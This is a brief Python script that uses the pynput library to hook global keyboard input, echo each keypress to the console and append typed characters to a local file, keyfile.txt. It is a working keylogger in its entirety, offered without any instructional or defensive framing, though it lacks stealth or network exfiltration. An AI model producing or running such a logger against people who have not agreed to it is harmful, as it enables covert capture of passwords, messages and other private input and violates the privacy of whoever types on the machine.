from pynput import keyboard

def on_key_press(key):
    print(str(key))
    try:
        with open("keyfile.txt", 'a') as log_file:
            char = key.char
            log_file.write(char)
    except AttributeError:
        print("Error getting char")

if __name__ == "__main__":
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()
